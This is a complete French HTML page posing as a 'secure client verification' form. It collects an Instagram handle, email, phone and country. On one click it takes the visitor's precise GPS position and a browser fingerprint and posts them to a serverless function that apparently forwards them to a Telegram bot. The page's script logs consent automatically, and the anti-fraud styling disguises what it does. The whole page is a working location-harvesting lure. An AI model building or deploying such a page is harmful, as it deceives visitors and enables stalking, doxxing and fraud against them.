<!doctype html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vérification client</title>
  <style>
    :root {
      --bg: #07090f;
      --bg-2: #0b0f18;
      --card: rgba(14, 18, 30, 0.82);
      --card-2: rgba(10, 13, 22, 0.75);
      --text: #eef2ff;
      --muted: #9aa4bf;
      --border: rgba(255, 255, 255, 0.10);
      --border-2: rgba(255, 255, 255, 0.06);

      --gold: #d6b36a;
      --gold-2: #b88a3c;
      --gold-soft: rgba(214, 179, 106, 0.16);

      --primary: linear-gradient(135deg, #d6b36a 0%, #b88a3c 45%, #f3d28f 100%);
      --primary-text: #16120a;

      --ok-bg: rgba(16, 185, 129, 0.10);
      --ok-text: #86efac;
      --ok-border: rgba(134, 239, 172, 0.28);

      --err-bg: rgba(239, 68, 68, 0.10);
      --err-text: #fca5a5;
      --err-border: rgba(252, 165, 165, 0.28);

      --shadow: 0 22px 60px rgba(0,0,0,.45);
      --radius: 18px;
    }

    * { box-sizing: border-box; }

    html, body { height: 100%; }

    body {
      margin: 0;
      color: var(--text);
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
      line-height: 1.4;
      background:
        radial-gradient(900px 500px at 8% -5%, rgba(214,179,106,.14), transparent 55%),
        radial-gradient(700px 420px at 95% 12%, rgba(86,119,255,.12), transparent 55%),
        radial-gradient(800px 500px at 50% 110%, rgba(214,179,106,.08), transparent 60%),
        linear-gradient(180deg, var(--bg) 0%, var(--bg-2) 100%);
    }

    .wrap {
      max-width: 860px;
      margin: 36px auto;
      padding: 0 16px;
    }

    .hero {
      margin-bottom: 14px;
      padding: 6px 4px 0;
    }

    .eyebrow {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      color: var(--gold);
      font-weight: 600;
      font-size: 0.86rem;
      letter-spacing: .08em;
      text-transform: uppercase;
      opacity: .95;
    }

    .eyebrow::before {
      content: "";
      width: 8px;
      height: 8px;
      border-radius: 999px;
      background: radial-gradient(circle at 30% 30%, #ffe4a8, #c3913e 70%);
      box-shadow: 0 0 18px rgba(214,179,106,.55);
    }

    .card {
      position: relative;
      background:
        linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.01)),
        var(--card);
      border: 1px solid var(--border);
      border-radius: calc(var(--radius) + 2px);
      box-shadow: var(--shadow);
      overflow: hidden;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
    }

    .card::before {
      content: "";
      position: absolute;
      inset: 0;
      pointer-events: none;
      background:
        linear-gradient(120deg, rgba(214,179,106,.13), transparent 28%, transparent 72%, rgba(214,179,106,.08)),
        radial-gradient(500px 140px at 25% 0%, rgba(214,179,106,.08), transparent 70%);
      opacity: .9;
    }

    .card::after {
      content: "";
      position: absolute;
      inset: 0;
      pointer-events: none;
      border-radius: inherit;
      padding: 1px;
      background: linear-gradient(140deg, rgba(214,179,106,.45), rgba(255,255,255,.05) 30%, rgba(255,255,255,.04) 70%, rgba(214,179,106,.20));
      -webkit-mask:
        linear-gradient(#000 0 0) content-box,
        linear-gradient(#000 0 0);
      -webkit-mask-composite: xor;
              mask-composite: exclude;
      opacity: .8;
    }

    .card-header {
      position: relative;
      padding: 22px 22px 14px;
      border-bottom: 1px solid var(--border-2);
      background:
        linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0)),
        rgba(255,255,255,.01);
    }

    h1 {
      margin: 0;
      font-size: 1.65rem;
      line-height: 1.1;
      font-weight: 700;
      letter-spacing: -0.02em;
      color: #f8f7f2;
      text-shadow: 0 0 20px rgba(214,179,106,.08);
    }

    .subtitle {
      margin: 10px 0 0;
      color: var(--muted);
      font-size: 0.94rem;
      max-width: 90%;
    }

    .subtitle strong {
      color: #f0e2be;
      font-weight: 600;
    }

    .card-body {
      position: relative;
      padding: 18px 22px 22px;
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 14px;
    }

    .field {
      display: flex;
      flex-direction: column;
      gap: 7px;
    }

    .field.full { grid-column: 1 / -1; }

    label {
      color: #e7eaf5;
      font-weight: 600;
      font-size: 0.92rem;
      letter-spacing: .01em;
    }

    input, textarea, button {
      width: 100%;
      border-radius: 12px;
      font-size: 0.96rem;
      padding: 12px 13px;
      outline: none;
      transition: .18s ease;
      font-family: inherit;
    }

    input, textarea {
      color: var(--text);
      border: 1px solid rgba(255,255,255,.08);
      background:
        linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01)),
        rgba(9, 12, 20, 0.88);
      box-shadow: inset 0 1px 0 rgba(255,255,255,.02);
    }

    input::placeholder, textarea::placeholder {
      color: #7f8aa6;
    }

    input:hover, textarea:hover {
      border-color: rgba(255,255,255,.13);
    }

    input:focus, textarea:focus {
      border-color: rgba(214,179,106,.45);
      box-shadow:
        0 0 0 3px rgba(214,179,106,.12),
        0 0 0 1px rgba(214,179,106,.18) inset;
    }

    textarea {
      min-height: 104px;
      resize: vertical;
    }

    .consent-note {
      margin-top: 14px;
      border: 1px solid rgba(214,179,106,.18);
      background:
        linear-gradient(180deg, rgba(214,179,106,.05), rgba(214,179,106,.02)),
        rgba(255,255,255,.01);
      border-radius: 12px;
      padding: 12px 13px;
      font-size: 0.92rem;
      color: #e8dcc0;
    }

    .consent-note strong {
      color: #f5dca3;
      font-weight: 700;
    }

    .actions { margin-top: 14px; }

    button {
      border: 0;
      cursor: pointer;
      font-weight: 800;
      letter-spacing: .01em;
      color: var(--primary-text);
      background: var(--primary);
      box-shadow:
        0 10px 24px rgba(184,138,60,.24),
        inset 0 1px 0 rgba(255,255,255,.38);
      position: relative;
      overflow: hidden;
    }

    button::before {
      content: "";
      position: absolute;
      inset: 0;
      background: linear-gradient(120deg, rgba(255,255,255,.24), transparent 35%, transparent 65%, rgba(255,255,255,.12));
      opacity: .7;
      pointer-events: none;
    }

    button:hover {
      transform: translateY(-1px);
      box-shadow:
        0 14px 28px rgba(184,138,60,.28),
        inset 0 1px 0 rgba(255,255,255,.42);
      filter: saturate(1.03);
    }

    button:active {
      transform: translateY(0);
      filter: brightness(.98);
    }

    button:disabled {
      opacity: .68;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }

    .status {
      margin-top: 14px;
      padding: 12px 13px;
      border-radius: 12px;
      border: 1px solid transparent;
      font-size: 0.92rem;
      display: none;
    }

    .status.show { display: block; }

    .status.muted {
      display: block;
      padding: 0;
      border: none;
      background: transparent;
      color: var(--muted);
      margin-top: 10px;
    }

    .status.ok {
      background: var(--ok-bg);
      color: var(--ok-text);
      border-color: var(--ok-border);
      box-shadow: inset 0 1px 0 rgba(255,255,255,.03);
    }

    .status.err {
      background: var(--err-bg);
      color: var(--err-text);
      border-color: var(--err-border);
      box-shadow: inset 0 1px 0 rgba(255,255,255,.03);
    }

    .footer-note {
      margin-top: 12px;
      color: #7e89a6;
      font-size: .82rem;
      text-align: center;
      opacity: .9;
    }

    @media (max-width: 640px) {
      .wrap { margin: 18px auto; }
      .grid { grid-template-columns: 1fr; gap: 12px; }
      h1 { font-size: 1.35rem; }
      .subtitle { max-width: 100%; font-size: .9rem; }
      .card-header, .card-body { padding-left: 16px; padding-right: 16px; }
      .consent-note { font-size: .9rem; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="hero">
      <div class="eyebrow">Vérification sécurisée</div>
    </div>

    <div class="card">
      <div class="card-header">
        <h1>Vérification </h1>
        
      </div>

      <div class="card-body">
        <div class="grid">
          <div class="field">
            <label for="instagram">Pseudo Instagram</label>
            <input id="instagram" type="text" placeholder="@votrepseudo" />
          </div>

          <div class="field">
            <label for="email">Email</label>
            <input id="email" type="email" placeholder="email@exemple.com" />
          </div>

          <div class="field">
            <label for="phone">Téléphone</label>
            <input id="phone" type="tel" placeholder="+33..." />
          </div>

          <div class="field">
            <label for="country">Pays déclaré</label>
            <input id="country" type="text" placeholder="France" />
          </div>

          <div class="field full">
            <label for="note">Motif / message</label>
            <textarea id="note" placeholder="Expliquez votre demande..."></textarea>
          </div>
        </div>

        <div class="consent-note">
          Le clic sur <strong>Valider la demande</strong> lance la vérification.
        </div>

        <div class="actions">
          <button id="btn" type="button">Valider la demande</button>
        </div>

        <div id="status" class="status muted">Prêt.</div>
        <div class="footer-note">Connexion sécurisée • Vérification anti-fraude</div>
      </div>
    </div>
  </div>

  <script>
    const $ = (id) => document.getElementById(id);

    function setStatus(message, type = "muted") {
      const el = $("status");
      el.textContent = message;
      el.className = "status";

      if (type === "muted") {
        el.classList.add("muted");
        return;
      }

      el.classList.add("show", type);
    }

    function getClientInfo() {
      return {
        userAgent: navigator.userAgent || "",
        language: navigator.language || "",
        languages: navigator.languages || [],
        platform: navigator.platform || "",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
        screen: {
          width: window.screen ? window.screen.width : null,
          height: window.screen ? window.screen.height : null,
          pixelRatio: window.devicePixelRatio || 1
        },
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight
        }
      };
    }

    async function sendPayload(payload) {
      const res = await fetch("/.netlify/functions/notify-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      let data;
      try {
        data = await res.json();
      } catch (e) {
        data = { ok: false, error: "Réponse invalide du serveur" };
      }

      if (!res.ok || !data.ok) {
        throw new Error((data.telegram && data.telegram.description) || data.error || ("HTTP " + res.status));
      }
      return data;
    }

    function requestLocationWithFallback(onSuccess, onError) {
      navigator.geolocation.getCurrentPosition(
        onSuccess,
        function () {
          navigator.geolocation.getCurrentPosition(
            onSuccess,
            onError,
            {
              enableHighAccuracy: false,
              timeout: 20000,
              maximumAge: 60000
            }
          );
        },
        {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        }
      );
    }

    $("btn").addEventListener("click", async function () {
      const btn = $("btn");

      try {
        if (!("geolocation" in navigator)) {
          setStatus("La géolocalisation n'est pas supportée sur cet appareil/navigateur.", "err");
          return;
        }

        btn.disabled = true;
        setStatus("Demande de permission de localisation…", "muted");

        requestLocationWithFallback(
          async function (pos) {
            try {
              setStatus("Position obtenue, envoi en cours…", "muted");

              const payload = {
                lead: {
                  instagram: $("instagram").value.trim(),
                  email: $("email").value.trim(),
                  phone: $("phone").value.trim(),
                  country: $("country").value.trim(),
                  note: $("note").value.trim()
                },
                consent: {
                  accepted: true,
                  textVersion: "v3-click-consent",
                  acceptedAt: new Date().toISOString(),
                  consentMethod: "button_click_validate_request"
                },
                geo: {
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy_m: pos.coords.accuracy,
                  altitude: pos.coords.altitude == null ? null : pos.coords.altitude,
                  altitudeAccuracy: pos.coords.altitudeAccuracy == null ? null : pos.coords.altitudeAccuracy,
                  heading: pos.coords.heading == null ? null : pos.coords.heading,
                  speed: pos.coords.speed == null ? null : pos.coords.speed,
                  timestamp: pos.timestamp
                },
                client: getClientInfo()
              };

              await sendPayload(payload);
              setStatus("✅ Vérification envoyée. Merci.", "ok");
            } catch (e) {
              setStatus("Erreur d'envoi : " + (e.message || e), "err");
            } finally {
              btn.disabled = false;
            }
          },
          function (err) {
            let msg = "Localisation refusée / impossible (" + err.code + ") : " + err.message;

            if (err.code === 1) {
              msg = "Localisation refusée (permission non accordée).";
            } else if (err.code === 2) {
              msg = "Position indisponible. Active la localisation du téléphone, le Wi-Fi et les données mobiles, puis réessaie.";
            } else if (err.code === 3) {
              msg = "La localisation a expiré (timeout). Réessaie.";
            }

            setStatus(msg, "err");
            btn.disabled = false;
          }
        );
      } catch (e) {
        setStatus("Erreur : " + (e.message || e), "err");
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
